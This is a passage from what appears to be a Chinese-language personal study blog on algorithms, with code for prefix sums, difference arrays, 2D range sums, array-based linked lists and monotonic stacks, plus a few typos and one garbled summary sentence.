class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//维护前缀和的写法[3, 4, 8, 13, 15]</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sums</span><span class="hljs-params">(n)</span></span>;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">s</span><span class="hljs-params">(n<span class="hljs-number">+1</span>)</span></span>; <br>s[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>; <br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>; i&lt;=n; i++) &#123;<br>    s[i] = s[i<span class="hljs-number">-1</span>] + sums[i<span class="hljs-number">-1</span>]; <br>&#125;<br><br><br><span class="hljs-comment">//preMin写法，从左往右遍历，preMin[] = [3, 1, 1, 1, 1]</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">preMin</span><span class="hljs-params">(n)</span></span>;<br>preMin[<span class="hljs-number">0</span>] = s[<span class="hljs-number">0</span>];  <span class="hljs-comment">//这里的s指的是前缀和数组</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>    preMin[i] = <span class="hljs-built_in">min</span>(preMin[i<span class="hljs-number">-1</span>], s[i]);   <br>&#125;<br><br><br><span class="hljs-comment">//preMax写法，从左往右遍历，preMax[] = [3, 3, 4, 5, 5]</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">preMax</span><span class="hljs-params">(n)</span></span>;<br>preMax[<span class="hljs-number">0</span>] = s[<span class="hljs-number">0</span>];  <br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>    preMax[i] = <span class="hljs-built_in">max</span>(preMax[i<span class="hljs-number">-1</span>], s[i]);  <br>&#125;<br><br><span class="hljs-comment">//sufMin 的写法，从右往左遍历，sufMin[] = [1, 1, 2, 2, 2]</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sufMin</span><span class="hljs-params">(n)</span></span>;<br>sufMin[n<span class="hljs-number">-1</span>] = s[n<span class="hljs-number">-1</span>]; <br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>    sufMin[i] = <span class="hljs-built_in">min</span>(sufMin[i + <span class="hljs-number">1</span>], s[i]);  <br>&#125;<br><br><span class="hljs-comment">//sufMax 的写法，从右往左遍历，sufMax[] = [5, 5, 5, 5, 2]</span><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sufMax</span><span class="hljs-params">(n)</span></span>;<br>sufMax[n<span class="hljs-number">-1</span>] = s[n<span class="hljs-number">-1</span>];  <br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>    sufMax[i] = <span class="hljs-built_in">max</span>(sufMax[i + <span class="hljs-number">1</span>], s[i]); <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>思路</strong>：我们可以利用前缀和将问题转换为寻找满足条件的区间，通过记录前缀和的变化，使用哈希表来高效解决问题。所以只需用一个计数数组或 hash map 维护S中每个值的个数，枚举右端点 i，看一下等于S[i]-k 的值有几个就行了</p><h4 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h4><h5 id="优美子数组和问题"><a href="#优美子数组和问题" class="headerlink" title="优美子数组和问题"></a>优美子数组和问题</h5><p>子数组中的奇数个数等于给定的整数 <code>k</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java">#include &lt;vector&gt;<br>#include &lt;unordered_map&gt;<br><br>using namespace std;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">numOfSubarrays</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> nums.size();<br>    vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">s</span><span class="hljs-params">(n + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)</span>; <span class="hljs-comment">// 前缀和数组 s(0-n)，初始化为0</span><br>    unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; count; <span class="hljs-comment">// 用于记录前缀和出现的次数</span><br>    count[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>; <span class="hljs-comment">// 初始前缀和为0时，计数为1</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">ans</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 计算前缀和 s[i]，其中 nums[i-1] 是当前元素，nums[i-1] % 2 用于判断奇偶性</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        s[i] = s[i - <span class="hljs-number">1</span>] + nums[i - <span class="hljs-number">1</span>] % <span class="hljs-number">2</span>; <span class="hljs-comment">// 前缀和的奇偶性计算</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-keyword">if</span> (s[i] - k &gt;= <span class="hljs-number">0</span>) &#123;<br>            ans += count[s[i] - k]; <span class="hljs-comment">// 如果满足条件，累加出现的次数</span><br>        &#125;<br>        count[s[i]]++; <span class="hljs-comment">// 更新当前前缀和出现的次数</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>解析：我们可以利用前缀和将问题转换为寻找满足条件的区间，通过记录前缀和的变化，使用哈希表来高效解决问题。所以只需用一个计数数组或 hash map 维护S中每个值的个数，枚举右端点 i，看一下等于S[i]-k 的值有几个就行了</p><h5 id="最大子数组和问题"><a href="#最大子数组和问题" class="headerlink" title="最大子数组和问题"></a>最大子数组和问题</h5><p>问题描述：给定一个整数数组，要求找到其最大子数组的和。子数组的定义是数组中连续的一部分元素。</p><p><strong>思路</strong>：</p><p>可以通过前缀和的方式来求解最大子数组和问题。</p><p>同时我们需要一个 <code>preMin</code> 数组来记录当前子数组的前缀和中的最小值，以便在当前区间进行减法操作时，获得可能的最大子数组和。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">maxSubArray</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> nums.length;<br>    <span class="hljs-type">int</span>[] s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n+<span class="hljs-number">1</span>]; <span class="hljs-comment">// 前缀和数组</span><br>    <span class="hljs-type">int</span>[] preMin = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[n+<span class="hljs-number">1</span>]; <span class="hljs-comment">// 前缀最小值数组</span><br>    s[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        s[i] = s[i-<span class="hljs-number">1</span>] + nums[i-<span class="hljs-number">1</span>]; <span class="hljs-comment">// 计算前缀和</span><br>    &#125;<br>    preMin[<span class="hljs-number">0</span>] = s[<span class="hljs-number">0</span>]; <span class="hljs-comment">//preMin书写模版</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        preMin[i] = Math.min(preMin[i-<span class="hljs-number">1</span>], s[i]); <span class="hljs-comment">// 维护前缀最小值</span><br>    &#125;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">ans</span> <span class="hljs-operator">=</span> -<span class="hljs-number">10000</span>; <span class="hljs-comment">// 初始化答案</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        ans = Math.max(ans, s[i] - preMin[i-<span class="hljs-number">1</span>]); <span class="hljs-comment">// 计算最大子数组和 从一开始</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="一维差分数组"><a href="#一维差分数组" class="headerlink" title="一维差分数组"></a>一维差分数组</h3><p>总结：把 A的第!个数到第r个数加 d，B 的变化为:B;加 d，B,+ 减d，它比较适用于我们想把一段儿-个子段都加一个值的时候。比如我们想把a的dl到底I个数啊啊|到r这个字段都加一个数d。</p><ul><li><p><strong>差分数组</strong>的引入则为高效区间更新提供了一种新的方法。在解决大规模区间更新问题时，如果直接对原数组进行操作，时间复杂度会比较高，而差分数组通过记录相邻元素之间的差值，在常数时间内更新区间，最后通过前缀和恢复原数组。</p></li><li><p>例如，在航班预定问题中，差分数组 <code>id</code> 被用来记录每个区间的变化量，最终通过前缀和恢复预定后的航班乘客数量。</p></li><li><p>差分数组的本质是通过对局部变化的记录和累积，使得区间更新可以在 O(1) 时间内完成，极大优化了需要频繁进行更新操作的场景。</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++">宇航票预定<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">book</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; bookings, <span class="hljs-type">int</span> n)</span> </span>&#123;<br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">id</span><span class="hljs-params">(n + <span class="hljs-number">2</span>, <span class="hljs-number">0</span>)</span></span>;<br>        <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; booking : bookings) &#123;<br>            <span class="hljs-type">int</span> a = booking[<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> b = booking[<span class="hljs-number">1</span>];<br>            <span class="hljs-type">int</span> c = booking[<span class="hljs-number">2</span>];<br>            id[a] += c;<br>            id[b + <span class="hljs-number">1</span>] -= c;<br>        &#125;<br><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">sum</span><span class="hljs-params">(n + <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>            sum[i] = sum[i - <span class="hljs-number">1</span>] + id[i];<br>        &#125;<br><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">answer</span><span class="hljs-params">(n, <span class="hljs-number">0</span>)</span></span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>            answer[i - <span class="hljs-number">1</span>] = sum[i];<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> answer;<br>    &#125;<br><br></code></pre></td></tr></table></figure><h3 id="二维前缀和"><a href="#二维前缀和" class="headerlink" title="二维前缀和"></a>二维前缀和</h3><ul><li><p>在本部分的笔记中，前缀和的概念被推广到了二维情况。二维前缀和 <code>S[i][j]</code> 表示的是从矩阵左上角 <code>(1, 1)</code> 到当前坐标 <code>(i, j)</code> 的所有元素的累加和，这一概念让我们能够快速计算任意矩形区域内的元素和。</p></li><li><p>类似于一维前缀和的区间和公式，二维前缀和的矩形区域和通过前缀和数组快速求解，避免了重复计算。计算区域 <code>(p, q)</code> 到 <code>(i, j)</code> 的矩形区域和的公式为：</p><ul><li><code>sum(p, q, i, j) = S[i][j] - S[i][q-1] - S[p-1][j] + S[p-1][q-1]</code></li></ul></li><li><p>这种方式不仅能快速处理问题，还能提升算法的时间复杂度，尤其适合处理较大规模的矩阵求和问题。</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++">二维区域的和<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">NumMatrix</span><span class="hljs-params">(<span class="hljs-type">int</span>[][] matrix)</span> </span>&#123;<br>    <span class="hljs-type">int</span> n = matrix.length;<br>    <span class="hljs-type">int</span> m = matrix[<span class="hljs-number">0</span>].length;<br>    sum = <span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[n + <span class="hljs-number">1</span>][m + <span class="hljs-number">1</span>];<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= m; j++) &#123;<br>            sum[i][j] = sum[i - <span class="hljs-number">1</span>][j] + sum[i][j - <span class="hljs-number">1</span>] - sum[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>] + matrix[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title">sumRegion</span><span class="hljs-params">(<span class="hljs-type">int</span> row1, <span class="hljs-type">int</span> col1, <span class="hljs-type">int</span> row2, <span class="hljs-type">int</span> col2)</span> </span>&#123;<br>    row1 += <span class="hljs-number">1</span>;<br>    col1 += <span class="hljs-number">1</span>;<br>    row2 += <span class="hljs-number">1</span>;<br>    col2 += <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">return</span> sum[row2][col2] - sum[row1 - <span class="hljs-number">1</span>][col2] - sum[row2][col1 - <span class="hljs-number">1</span>] + sum[row1 - <span class="hljs-number">1</span>][col1 - <span class="hljs-number">1</span>];<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="二维差分数组"><a href="#二维差分数组" class="headerlink" title="二维差分数组"></a>二维差分数组</h3><hr><h2 id="四-进制转换"><a href="#四-进制转换" class="headerlink" title="四.进制转换"></a>四.进制转换</h2><hr><h2 id="五-找规律能力"><a href="#五-找规律能力" class="headerlink" title="五.找规律能力"></a>五.找规律能力</h2><hr><h2 id="六-链表"><a href="#六-链表" class="headerlink" title="六.链表"></a>六.链表</h2><p>直接链表实现过于浪费，我们一般通过数组来模拟链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// head存储链表头，e[]存储节点的值，ne[]存储节点的next指针，idx表示当前用到了哪个节点</span><br><span class="hljs-type">int</span> head, e[N], ne[N], idx;<br><span class="hljs-comment">// 初始化</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>    head = <span class="hljs-number">-1</span>;<br>    idx = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// 在链表头插入一个数a</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span>&#123;<br>    e[idx] = a, ne[idx] = head, head = idx ++ ;<br>&#125;<br><span class="hljs-comment">// 将头结点删除，需要保证头结点存在</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">remove</span><span class="hljs-params">()</span>&#123;<br>    head = ne[head];<br>&#125;<br><span class="hljs-comment">// 在第k个位置插入一个数a (k是从1开始的)</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">insertAt</span><span class="hljs-params">(<span class="hljs-type">int</span> k, <span class="hljs-type">int</span> a)</span> &#123;<br>    <span class="hljs-keyword">if</span> (k == <span class="hljs-number">1</span>) &#123;<br>        insert(a);  <span class="hljs-comment">// 如果是插入头部，直接调用插入头部的函数</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> cur = head;<br>    <span class="hljs-comment">// 找到第k-1个节点</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; k - <span class="hljs-number">1</span> &amp;&amp; cur != <span class="hljs-number">-1</span>; i++) &#123;<br>        cur = ne[cur];<br>    &#125;<br>    <span class="hljs-keyword">if</span> (cur == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// 如果k超出了链表的范围</span><br>    e[idx] = a;<br>    ne[idx] = ne[cur];  <span class="hljs-comment">// 新节点的next指向第k个节点</span><br>    ne[cur] = idx;      <span class="hljs-comment">// 第k-1个节点的next指向新节点</span><br>    idx++;<br>&#125;<br><span class="hljs-comment">// 删除第k个位置的元素 (k是从1开始的)</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">removeAt</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span> &#123;<br>    <span class="hljs-keyword">if</span> (k == <span class="hljs-number">1</span>) &#123;<br>        remove();  <span class="hljs-comment">// 如果删除的是头结点，直接调用删除头结点的函数</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> cur = head;<br>    <span class="hljs-comment">// 找到第k-1个节点</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; k - <span class="hljs-number">1</span> &amp;&amp; cur != <span class="hljs-number">-1</span>; i++) &#123;<br>        cur = ne[cur];<br>    &#125;<br>    <span class="hljs-keyword">if</span> (cur == <span class="hljs-number">-1</span> || ne[cur] == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// k超出范围</span><br>    <span class="hljs-comment">// 删除第k个节点</span><br>    <span class="hljs-type">int</span> temp = ne[cur];<br>    ne[cur] = ne[temp];  <span class="hljs-comment">// 第k-1个节点的next指向第k+1个节点</span><br>&#125;<br><span class="hljs-comment">// 查找第k个位置的元素 (k是从1开始的)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getAt</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span> &#123;<br>    <span class="hljs-type">int</span> cur = head;<br>    <span class="hljs-comment">// 遍历到第k个节点</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; k &amp;&amp; cur != <span class="hljs-number">-1</span>; i++) &#123;<br>        cur = ne[cur];<br>    &#125;<br>    <span class="hljs-keyword">if</span> (cur == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">// 如果k超出了链表的范围</span><br>    <span class="hljs-keyword">return</span> e[cur];<br>&#125;<br><span class="hljs-comment">// 输出链表所有元素</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">printList</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> cur = head;<br>    <span class="hljs-keyword">while</span> (cur != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; e[cur] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        cur = ne[cur];<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><br><br><br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs perl">head  head 是一个指针，指向链表的第一个节点，因此它表示整个链表的起始<br><span class="hljs-number">1</span>-&gt;<span class="hljs-number">2</span>-&gt;<span class="hljs-number">3</span>-&gt;<span class="hljs-number">4</span>-&gt;null(补充的<span class="hljs-keyword">last</span>)<br><br> struct ListNode &#123;<br>    <span class="hljs-keyword">int</span> val;<br>    ListNode* <span class="hljs-keyword">next</span>;<br>    ListNode(<span class="hljs-keyword">int</span> <span class="hljs-keyword">x</span>) : val(<span class="hljs-keyword">x</span>), <span class="hljs-keyword">next</span>(nullptr) &#123;&#125;<br>&#125;;<br><br>ListNode* reverseList(ListNode* head) &#123;<br>    ListNode* <span class="hljs-keyword">last</span> = nullptr;<br>    <span class="hljs-keyword">while</span> (head != nullptr) &#123;<br>        ListNode* nextHead = head-&gt;<span class="hljs-keyword">next</span>;  <span class="hljs-regexp">//</span> 暂存下一个节点<br>        head-&gt;<span class="hljs-keyword">next</span> = <span class="hljs-keyword">last</span>;                <span class="hljs-regexp">//</span> 反转当前节点的指针<br>        <span class="hljs-keyword">last</span> = head;                      <span class="hljs-regexp">//</span> 更新<span class="hljs-keyword">last</span>为当前节点<br>        head = nextHead;                  <span class="hljs-regexp">//</span> 继续处理下一个节点<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">last</span>;                          <span class="hljs-regexp">//</span> 返回新头节点<br>&#125;<br><br></code></pre></td></tr></table></figure><p>+++++</p><h2 id="七-栈"><a href="#七-栈" class="headerlink" title="七.栈"></a>七.栈</h2><h3 id="模拟栈"><a href="#模拟栈" class="headerlink" title="模拟栈"></a>模拟栈</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// tt表示栈顶</span><br><span class="hljs-type">int</span> stk[N], tt = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// 向栈顶插入一个数</span><br>stk[ ++ tt] = x;<br><span class="hljs-comment">// 从栈顶弹出一个数</span><br>tt -- ;<br><span class="hljs-comment">// 栈顶的值</span><br>stk[tt];<br><span class="hljs-comment">// 判断栈是否为空</span><br><span class="hljs-keyword">if</span> (tt &gt; <span class="hljs-number">0</span>)<br>&#123;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="单调栈"><a href="#单调栈" class="headerlink" title="单调栈"></a>单调栈</h3><p>经验</p><p>当新h小于之前的h,进行累加长度更新答案,pop上一个被推的栈,推累长加一的h栈</p><p>核心思想:单调栈考虑前面不影响后面<br>套路模版: </p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>; <span class="hljs-comment">//int一个答案要全局</span><br>heights.push_back(<span class="hljs-number">0</span>);  <span class="hljs-comment">// 如果需要弹空就写</span><br><span class="hljs-keyword">for</span>()&#123;<br><span class="hljs-keyword">int</span> accmulatedWidth = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(栈顶与新元素不满足单调栈)&#123;<br> 累加长度<br> 更新答案<br> <span class="hljs-keyword">pop</span>弹栈<br> ....... <span class="hljs-comment">//期间可以思考增加限制</span><br>&#125;<br>s.<span class="hljs-keyword">push</span>(&#123;accmulatedWidth+<span class="hljs-number">1</span>,height&#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="例子-3"><a href="#例子-3" class="headerlink" title="例子"></a>例子</h3><h4 id="柱状图中最大矩形"><a href="#柱状图中最大矩形" class="headerlink" title="柱状图中最大矩形"></a>柱状图中最大矩形</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">heighs=[<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>] <br>private:<br>stuct UERT&#123;<br><span class="hljs-type">int</span> width;<br><span class="hljs-type">int</span> height;<br>&#125;;<br><span class="hljs-built_in">stack</span> &lt;UERT&gt; s;<br>public:<br><span class="hljs-type">int</span> <span class="hljs-title function_">largestRectangleArea</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; heights)</span> &#123;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br>    heights.push_back(<span class="hljs-number">0</span>);  <span class="hljs-comment">// 便于最后清空栈</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> height:heights) &#123;<br>    <span 